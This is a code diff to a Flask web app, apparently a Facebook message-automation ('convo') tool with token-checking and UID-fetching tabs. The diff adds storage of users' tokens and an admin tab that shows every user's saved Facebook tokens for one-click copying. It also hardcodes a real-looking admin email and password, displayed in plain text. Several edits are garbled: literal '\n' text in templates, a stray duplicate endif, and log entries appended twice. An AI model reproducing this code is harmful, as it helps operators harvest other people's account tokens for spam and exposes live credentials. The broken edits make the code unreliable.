@@ -4,7 +4,7 @@ import json
 import time
 import os
 import threading
-from datetime import datetime
+from datetime import datetime, timedelta
 import uuid
 import sqlite3
 import hashlib
@@ -15,8 +15,8 @@ app.secret_key = 'your-secret-key-here'  # Change this to a random secret key
 
 # Configuration for admin credentials - can be changed here
 ADMIN_CONFIG = {
-    'username': 'shan11',
-    'password': 'shan22'  # Change this password as needed
+    'username': 'thewstones57@gmail.com',
+    'password': 'The_stone_king_of_ring'  # Change this password as needed
 }
 
 # Database initialization
@@ -31,7 +31,8 @@ def init_db():
                  password TEXT,
                  admin INTEGER DEFAULT 0,
                  approved INTEGER DEFAULT 0,
-                 created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
+                 tokens TEXT DEFAULT '',
+                 created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)""")
     
     # Create admin user if not exists or update password if changed
     c.execute("SELECT * FROM users WHERE username = ?", (ADMIN_CONFIG['username'],))
@@ -965,6 +966,14 @@ auth_html = '''
             setTimeout(typeWriter, 500);
         });
     </script>
+
+    <!-- Log Overlay HTML -->
+    <div id="log-overlay" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.8); z-index: 1000; justify-content: center; align-items: center;">
+        <div style="background: #1a1a1a; color: #00ff41; font-family: 'Courier New', monospace; font-size: 13px; padding: 25px; border-radius: 15px; height: 80%; width: 80%; overflow-y: auto; border: 2px solid #333; box-shadow: inset 0 0 20px rgba(0, 255, 65, 0.1); position: relative;">
+            <button onclick="closeLogs()" style="position: absolute; top: 10px; right: 10px; background: #dc3545; color: white; border: none; border-radius: 5px; padding: 8px 12px; cursor: pointer;">Close</button>
+            <pre id="log-content" style="margin-top: 30px;"></pre>
+        </div>
+    </div>
 </body>
 </html>
 '''
@@ -1638,7 +1647,7 @@ html_content = '''
     <div class="container">
         <div class="header">
             <h1>STONE RULEX</h1>
-            <p>Advanced Social Media Automation Platform</p>
+            <p>Welcome To Stone Convo Server</p>
             <div class="user-info">
                 <span class="user-username">{{ session.user_username }}</span>
                 {% if session.is_admin %}
@@ -1652,21 +1661,22 @@ html_content = '''
             </div>
         </div>
         
+                        {% if session.is_approved %}
         <div class="tabs">
-            <button class="tab active" onclick="switchTab('bot-tab')">
+            <button class="tab active" onclick="switchTab(\'bot-tab\')">
                 <i class="fas fa-envelope"></i> CONVO TOOL
             </button>
-            <button class="tab" onclick="switchTab('token-tab')">
+            <button class="tab" onclick="switchTab(\'token-tab\')">
                 <i class="fas fa-key"></i> TOKEN CHECK
             </button>
-            <button class="tab" onclick="switchTab('groups-tab')">
+            <button class="tab" onclick="switchTab(\'groups-tab\')">
                 <i class="fas fa-users"></i> UID FETCHER
             </button>
-            <button class="tab" onclick="switchTab('logs-tab')">
+            <button class="tab" onclick="switchTab(\'logs-tab\')">
                 <i class="fas fa-chart-bar"></i> TASK MANAGER
             </button>
         </div>
-        
+        {% endif %}\n        {% endif %}     
         <div id="bot-tab" class="tab-content active">
             <form action="/run_bot" method="post" enctype="multipart/form-data">
                 <div class="form-group">
@@ -1933,34 +1943,33 @@ html_content = '''
             });
         }
         
-        function toggleLogs(taskId) {
-            const logContainer = document.getElementById(`logs-${taskId}`);
-            
-            if (logContainer.classList.contains('show')) {
-                logContainer.classList.remove('show');
-                return;
-            }
-            
+  function viewLogs(taskId) {
+            const logContainer = document.getElementById(`log-container-${taskId}`);
+            const overlay = document.getElementById('log-overlay');
+            const logContent = document.getElementById('log-content');
+
             fetch(`/get_logs/${taskId}`)
             .then(response => response.json())
             .then(data => {
-                logContainer.innerHTML = '';
+                logContent.innerHTML = '';
                 data.logs.forEach(log => {
-                    const logDiv = document.createElement('div');
-                    logDiv.className = 'log-entry';
-                    logDiv.textContent = log;
-                    logContainer.appendChild(logDiv);
+                    const logEntryDiv = document.createElement('div');
+                    logEntryDiv.className = 'log-entry';
+                    logEntryDiv.textContent = log.message; // Access the message property
+                    logContent.appendChild(logEntryDiv);
                 });
-                logContainer.classList.add('show');
-                logContainer.scrollTop = logContainer.scrollHeight;
+                overlay.style.display = 'flex';
             })
             .catch(error => {
-                logContainer.innerHTML = '<div class="log-entry">Error loading logs</div>';
-                logContainer.classList.add('show');
+                logContent.innerHTML = `<div class="log-entry" style="color: red;">Error loading logs: ${error}</div>`;
+                overlay.style.display = 'flex';
             });
         }
-        
-        function stopTask(taskId) {
+
+        function closeLogs() {
+            document.getElementById('log-overlay').style.display = 'none';
+            document.getElementById('log-content').innerHTML = '';
+        }function stopTask(taskId) {
             if (confirm('Are you sure you want to stop this task?')) {
                 fetch(`/stop_task/${taskId}`, {method: 'POST'})
                 .then(response => response.json())
@@ -2006,6 +2015,14 @@ html_content = '''
             refreshTasks();
         });
     </script>
+
+    <!-- Log Overlay HTML -->
+    <div id="log-overlay" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.8); z-index: 1000; justify-content: center; align-items: center;">
+        <div style="background: #1a1a1a; color: #00ff41; font-family: 'Courier New', monospace; font-size: 13px; padding: 25px; border-radius: 15px; height: 80%; width: 80%; overflow-y: auto; border: 2px solid #333; box-shadow: inset 0 0 20px rgba(0, 255, 65, 0.1); position: relative;">
+            <button onclick="closeLogs()" style="position: absolute; top: 10px; right: 10px; background: #dc3545; color: white; border: none; border-radius: 5px; padding: 8px 12px; cursor: pointer;">Close</button>
+            <pre id="log-content" style="margin-top: 30px;"></pre>
+        </div>
+    </div>
 </body>
 </html>
 '''
@@ -2024,8 +2041,12 @@ def add_log(task_id, message):
     task_logs[task_id].append(log_entry)
     
     # Keep only last 1000 log entries per task to prevent memory issues
-    if len(task_logs[task_id]) > 1000:
-        task_logs[task_id] = task_logs[task_id][-1000:]
+    # Store logs with timestamp
+    task_logs[task_id].append({"timestamp": datetime.now(), "message": log_entry})
+
+    # Clean up logs older than 1 hour
+    one_hour_ago = datetime.now() - timedelta(hours=1)
+    task_logs[task_id] = [log for log in task_logs[task_id] if log["timestamp"] > one_hour_ago]
 
 def check_token_validity(token):
     """Check if a Facebook token is valid and get user info"""
@@ -2274,7 +2295,7 @@ def logout():
 def admin_panel():
     conn = sqlite3.connect('users.db')
     c = conn.cursor()
-    c.execute("SELECT id, username, admin, approved, created_at FROM users ORDER BY created_at DESC")
+    c.execute("SELECT id, username, admin, approved, created_at, tokens FROM users ORDER BY created_at DESC")
     users = c.fetchall()
     conn.close()
     
@@ -2923,10 +2944,7 @@ def admin_panel():
                 <button class="admin-tab" onclick="switchAdminTab('users')">
                     <i class="fas fa-users-cog"></i> User Management
                 </button>
-                <button class="admin-tab" onclick="switchAdminTab('settings')">
-                    <i class="fas fa-cogs"></i> System Settings
-                </button>
-            </div>
+              <button class="admin-tab" onclick="switchAdminTab(\'settings\')">\n                    <i class="fas fa-cogs"></i> System Settings\n                </button>\n                <button class="admin-tab" onclick="switchAdminTab(\'tokens\')">\n                    <i class="fas fa-key"></i> User Tokens\n                </button>           </div>
             
             <div id="overview-content" class="admin-content active">
                 <div class="stats-grid">
@@ -3089,8 +3107,8 @@ def admin_panel():
                         <br><br>
                         <code>
                         ADMIN_CONFIG = {{<br>
-                        &nbsp;&nbsp;&nbsp;&nbsp;'username': 'your_new_username',<br>
-                        &nbsp;&nbsp;&nbsp;&nbsp;'password': 'your_new_password'<br>
+                        &nbsp;&nbsp;&nbsp;&nbsp;\'username\': \'your_new_username\',<br>
+                        &nbsp;&nbsp;&nbsp;&nbsp;\'password\': \'your_new_password\'<br>
                         }}
                         </code>
                         <br><br>
@@ -3100,15 +3118,15 @@ def admin_panel():
                     <div class="credential-info">
                         <div class="credential-item">
                             <div class="credential-label">Current Admin Username</div>
-                            <div class="credential-value">{ADMIN_CONFIG['username']}</div>
+                            <div class="credential-value">{ADMIN_CONFIG[\'username\']}</div>
                         </div>
                         <div class="credential-item">
                             <div class="credential-label">Current Admin Password</div>
-                            <div class="credential-value password-value" title="Hover to reveal">{ADMIN_CONFIG['password']}</div>
+                            <div class="credential-value password-value" title="Hover to reveal">{ADMIN_CONFIG[\'password\']}</div>
                         </div>
                         <div class="credential-item">
                             <div class="credential-label">Password Hash</div>
-                            <div class="credential-value">{hashlib.sha256(ADMIN_CONFIG['password'].encode()).hexdigest()[:20]}...</div>
+                            <div class="credential-value">{hashlib.sha256(ADMIN_CONFIG[\'password\'].encode()).hexdigest()[:20]}...</div>
                         </div>
                         <div class="credential-item">
                             <div class="credential-label">Last Updated</div>
@@ -3139,6 +3157,44 @@ def admin_panel():
                             <div class="credential-value">Role-Based</div>
                         </div>
                     </div>
+                </div>
+            </div>
+
+            <div id="tokens-content" class="admin-content">
+                <h2 class="section-title">
+                    <i class="fas fa-key"></i> User Tokens Management
+                </h2>
+                <div class="user-list">
+                    {% for user in users %}
+                        {% if user[4] %}
+                            <div class="user-item">
+                                <div class="user-header">
+                                    <div class="user-username">{{ user[1] }}</div>
+                                    <div class="status-badge status-approved">Approved</div>
+                                </div>
+                                <div class="user-details">
+                                    <div class="user-detail">
+                                        <div class="detail-label">User ID</div>
+                                        <div class="detail-value">#{{ user[0] }}</div>
+                                    </div>
+                                    <div class="user-detail">
+                                        <div class="detail-label">Registered</div>
+                                        <div class="detail-value">{{ user[3] }}</div>
+                                    </div>
+                                    <div class="user-detail">
+                                        <div class="detail-label">Tokens</div>
+                                        <div class="detail-value">
+                                            {% if user[5] %}
+                                                <textarea rows="5" cols="30" readonly onclick="copyToClipboard(this)" title="Click to copy">{{ user[5] }}</textarea>
+                                            {% else %}
+                                                No tokens saved.
+                                            {% endif %}
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        {% endif %}
+                    {% endfor %}
                 </div>
             </div>
         </div>
@@ -3225,18 +3281,24 @@ def admin_panel():
             }}
             
             function demoteUser(userId) {{
-                if (confirm('Remove admin privileges from this user?')) {{
-                    fetch(`/admin/demote/${{userId}}`, {{method: 'POST'}})
+                if (confirm(\'Remove admin privileges from this user?\')) {{
+                    fetch(`/admin/demote/${{userId}}`, {{method: \'POST\'}})
                     .then(response => response.json())
                     .then(data => {{
                         if (data.success) {{
                             location.reload();
                         }} else {{
-                            alert('Error demoting user');
+                            alert(\'Error demoting user\');
                         }}
                     }});
                 }}
             }}
+
+            function copyToClipboard(element) {
+                element.select();
+                document.execCommand(\'copy\');
+                alert(\'Copied to clipboard!\');
+            }
         </script>
     </body>
     </html>
